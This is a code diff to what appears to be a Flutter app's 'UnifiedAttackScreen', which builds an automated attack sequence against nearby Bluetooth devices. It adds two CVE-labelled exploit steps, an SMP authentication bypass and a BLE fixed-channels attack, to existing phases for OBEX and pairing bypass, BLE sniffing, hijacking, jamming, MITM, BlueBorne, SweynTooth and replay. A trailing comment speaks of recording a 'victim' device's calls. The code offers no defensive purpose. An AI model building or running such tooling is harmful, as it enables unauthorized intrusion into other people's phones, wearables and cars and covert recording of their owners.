@@ -685,37 +685,41 @@ class _UnifiedAttackScreenState extends State<UnifiedAttackScreen> with SingleTi
          sequence.add({'type': 'map_folders', 'name': 'MAP_FOLDERS', 'phase': 1, 'timeout': 10000, 'retries': 1});
        }
 
-      // ==========================================
-      // FASE 2: BYPASS DE AUTHENTICACIÓN (paralelo, intentar ANTES de extracción)
-      // ==========================================
-      if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || deviceType_lower.contains('unknown')) {
-        // Intentar bypass de OBEX trust (sin pairing)
-        sequence.add({'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'phase': 2, 'timeout': 8000, 'retries': 1});
-        // Intentar quick connect race
-        sequence.add({'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'phase': 2, 'timeout': 8000, 'retries': 2});
-      }
+       // ==========================================
+       // FASE 2: BYPASS DE AUTHENTICACIÓN (paralelo, intentar ANTES de extracción)
+       // ==========================================
+       if (deviceType_lower.contains('smartphone') || deviceType_lower.contains('tablet') || deviceType_lower.contains('unknown')) {
+         // Intentar bypass de OBEX trust (sin pairing)
+         sequence.add({'type': 'bypass', 'command': 'obex_trust', 'name': 'BYPASS_OBEX', 'phase': 2, 'timeout': 8000, 'retries': 1});
+         // Intentar quick connect race
+         sequence.add({'type': 'bypass', 'command': 'quick_connect', 'name': 'BYPASS_QUICK', 'phase': 2, 'timeout': 8000, 'retries': 2});
+         // Intentar SMP bypass (CVE-2025-26438)
+         sequence.add({'type': 'cve_2025_26438_smp_bypass', 'name': 'SMP_BYPASS_26438', 'phase': 2, 'timeout': 15000, 'retries': 2});
+       }
 
-      // ==========================================
-      // FASE 3: BLE EXPLOITS (paralelo, si tiene BLE)
-      // ==========================================
-      if (deviceInfo['hasBle'] == true || deviceType_lower.contains('wearable') || deviceType_lower.contains('car')) {
-        // Escaneo BLE básico
-        sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
-        sequence.add({'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'phase': 3, 'timeout': 15000, 'retries': 1});
-        // Ataques BLE avanzados (session hijack, jamming, MITM)
-        sequence.add({'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'phase': 3, 'timeout': 12000, 'retries': 2});
-        sequence.add({'type': 'btlejack', 'command': 'jam', 'name': 'BTLE_JAM', 'phase': 3, 'timeout': 10000, 'retries': 1});
-        sequence.add({'type': 'btlejack', 'command': 'mitm', 'name': 'BLE_MITM', 'phase': 3, 'timeout': 15000, 'retries': 2});
-        // BLUR + SweynTooth (BLE 5.x modern exploits)
-        sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
-        sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
-        // BlueBorne (L2CAP, no pairing)
-        sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
-        // BLE pairing bypass attempts
-        sequence.add({'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'phase': 3, 'timeout': 10000, 'retries': 2});
-        sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
-        // BLE GATT replay attack
-        sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
+       // ==========================================
+       // FASE 3: BLE EXPLOITS (paralelo, si tiene BLE)
+       // ==========================================
+       if (deviceInfo['hasBle'] == true || deviceType_lower.contains('wearable') || deviceType_lower.contains('car')) {
+         // Escaneo BLE básico
+         sequence.add({'type': 'btlejack', 'command': 'scan', 'name': 'BTLE_SCAN', 'phase': 3, 'timeout': 10000, 'retries': 2});
+         sequence.add({'type': 'btlejack', 'command': 'sniff', 'name': 'BTLE_SNIFF', 'phase': 3, 'timeout': 15000, 'retries': 1});
+         // Ataques BLE avanzados (session hijack, jamming, MITM)
+         sequence.add({'type': 'btlejack', 'command': 'hijack', 'name': 'BTLE_HIJACK', 'phase': 3, 'timeout': 12000, 'retries': 2});
+         sequence.add({'type': 'btlejack', 'command': 'jam', 'name': 'BTLE_JAM', 'phase': 3, 'timeout': 10000, 'retries': 1});
+         sequence.add({'type': 'btlejack', 'command': 'mitm', 'name': 'BLE_MITM', 'phase': 3, 'timeout': 15000, 'retries': 2});
+         // BLUR + SweynTooth (BLE 5.x modern exploits)
+         sequence.add({'type': 'blur_attack', 'name': 'BLUR_ATTACK', 'phase': 3, 'timeout': 8000, 'retries': 2});
+         sequence.add({'type': 'sweyntooth_attack', 'name': 'SWEYNTOOTH', 'phase': 3, 'timeout': 8000, 'retries': 2});
+         // BlueBorne (L2CAP, no pairing)
+         sequence.add({'type': 'blueborne', 'name': 'BLUEBORNE', 'phase': 3, 'timeout': 12000, 'retries': 2});
+         // BLE pairing bypass attempts
+         sequence.add({'type': 'ble_pairing', 'command': 'justworks', 'name': 'BLE_JUSTWORKS', 'phase': 3, 'timeout': 10000, 'retries': 2});
+         sequence.add({'type': 'ble_exploit', 'command': 'secure', 'name': 'BLE_SC_BYPASS', 'phase': 3, 'timeout': 10000, 'retries': 2});
+         // BLE GATT replay attack
+         sequence.add({'type': 'ble_replay', 'name': 'BLE_REPLAY', 'phase': 3, 'timeout': 12000, 'retries': 1});
+         // === CVE-2025-10456: BLE Fixed Channels Vulnerability ===
+         sequence.add({'type': 'cve_2025_10456_ble_fixed', 'name': 'BLE_FIXED_10456', 'phase': 3, 'timeout': 10000, 'retries': 2});
 
         // === A2DP SINK RECORDING - captura audio del dispositivo ===
         // Graba llamadas/música/videollamadas del dispositivo víctima
